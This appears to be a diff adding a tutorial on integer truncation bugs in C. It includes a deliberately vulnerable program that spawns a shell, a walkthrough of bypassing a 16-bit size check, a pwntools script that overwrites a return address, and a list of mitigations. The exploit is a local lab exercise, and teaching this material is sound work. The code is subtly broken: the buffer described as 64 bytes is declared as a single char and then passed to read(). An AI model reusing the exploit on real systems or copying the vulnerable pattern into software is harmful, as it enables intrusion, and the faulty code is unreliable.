@@ -1,1 +1,119 @@
+An integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits. A truncation occurs when a larger integer type (like a 64-bit long or a 32-bit int) is cast down into a smaller integer type (like a 16-bit short or an 8-bit char), discarding the most significant bits.
+While integer overflows don't directly corrupt memory on their own, they are highly dangerous because they are frequently used to bypass bounds-checking logic, leading to subsequent stack or heap buffer overflows.
+
+1. Understanding the Limits (The Math)
+
+Integers have fixed bit-widths. When you exceed the maximum value, the number wraps around.
+• Unsigned 8-bit Integer (unsigned char): Holds 0 to 255. If you add 1 to 255, it wraps around to 0.
+• Signed 32-bit Integer (int): Holds -2,147,483,648 to 2,147,483,647. If you add 1 to 2,147,483,647, it becomes -2,147,483,648 (the sign bit flips).
+
+2. The Vulnerable C Program (int_vuln.c)
+
+In this program, a size check is put in place to prevent a buffer overflow. However, because the size variable is stored inside an unsafe integer type, an attacker can bypass the restriction.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Target achieved! Opening shell...\n");
+    system("/bin/sh");
+}
+
+void secure_allocation() {
+    char stack_buffer; // Max capacity is 64 bytes
+    unsigned int input_size;
+
+    printf("Enter requested buffer size: ");
+    if (scanf("%u", &input_size) != 1) return;
+    getchar(); // Clear newline
+
+    // TRUNCATION VULNERABILITY: input_size (32-bit) is downcast to a short (16-bit)
+    unsigned short check_size = (unsigned short)input_size;
+
+    // Bounds check uses the 16-bit truncated variable
+    if (check_size > 64) {
+        printf("[-] Error: Requested size (%d) is too large!\n", check_size);
+        return;
+    }
+
+    printf("[*] Size check passed (%d). Reading data...\n", check_size);
+
+    // MEMORY CORRUPTION: read() uses the original, large 32-bit 'input_size' 
+    // leading to an uncontrolled stack buffer overflow.
+    read(0, stack_buffer, input_size); 
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    secure_allocation();
+    return 0;
+}
+Use code with caution.
+
+3. Exploit Mechanics (The Truncation Trick)
+
+A 16-bit unsigned integer can only hold values up to 65,535.
+If we supply an input_size value of 65,540 (which in hexadecimal is 0x00010004):
+1. The compiler downcasts it to a 16-bit unsigned short for the comparison check.
+2. It strips away the higher 16 bits (0x0001), leaving only the lower 16 bits (0x0004).
+3. 0x0004 in decimal is 4.
+4. The condition if (4 > 64) evaluates to false, so the check passes safely!
+5. When read() executes, it uses the original 32-bit input_size of 65,540, letting us write past the 64-byte stack buffer and hijack the return address.
+text
+32-bit Input:  0x00010004  (65,540)
+                 ||  ||
+                 \/  \/
+16-bit Cast:       0x0004  (4)  --> Bypasses the "size > 64" check
+Use code with caution.
+
+4. The Python Exploit Script (int_exploit.py)
+
+This pwntools script delivers the wrapping value to pass the check, followed by the standard return-address overwrite payload.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+io = process('./int_vuln')
+
+# Address of win() from static analysis
+win_address = p32(0x080491b6)
+
+# Total padding to reach the return address
+# 64 (buffer) + 12 (compiler alignment) + 4 (Saved EBP) = 80 bytes
+offset = 80
+
+# Calculate the overflowing integer
+# 65536 wraps perfectly back to 0. We want it to equal 84 total payload bytes 
+# when checked as a short, so 65536 + 84 = 65620.
+magic_size = 65536 + offset + len(win_address) 
+
+# Step 1: Send the massive size that bypasses the truncation check
+io.recvuntil(b"Enter requested buffer size: ")
+log.info(f"Sending overflowing size value: {magic_size}")
+io.sendline(str(magic_size).encode())
+
+# Step 2: Send the buffer overflow payload
+# Even though the check thought we were sending a small amount, read() accepts the full size
+payload = b"A" * offset + win_address
+io.recvuntil(b"Reading data...\n")
+log.info("Sending payload to exploit the subsequent stack overflow...")
+io.sendline(payload)
+
+# Interact with the spawned shell
+io.interactive()
+Use code with caution.
+
+5. Defensive Mitigations
+
+Preventing integer-based bugs requires safe math validations and typing constraints:
+• Eliminate Downcasting: Ensure all variables processing boundaries, lengths, and sizes maintain a consistent data type throughout the function (e.g., exclusively use size_t).
+• Leverage Compiler Sanitizers: Compile applications with -fsanitize=signed-integer-overflow or -fsanitize=unsigned-integer-overflow. These flags instrument the binary to abort execution immediately if an illegal arithmetic wrap-around or truncation occurs at runtime.
+• Pre-Execution Math Bounds Checks: If performing addition or multiplication on array allocations, validate constraints explicitly before executing the equation:c
+// Secure multiplication overflow check
+if (num_elements > MAX_ELEMENTS / element_size) {
+    // Handle allocation error safely
+}
+Use code with caution.
 
